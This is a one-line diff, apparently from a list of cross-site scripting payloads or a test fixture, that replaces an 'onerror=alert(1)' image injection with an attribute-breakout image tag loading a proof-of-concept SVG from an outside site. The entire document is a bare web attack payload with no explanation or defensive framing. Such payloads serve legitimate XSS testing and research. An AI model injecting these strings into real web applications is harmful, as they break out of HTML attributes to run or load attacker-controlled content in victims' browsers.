@@ -1,1 +1,1 @@
-"><img src=x onerror=alert(1)>
+"><img src=http://brutelogic.com.br/poc.svg>
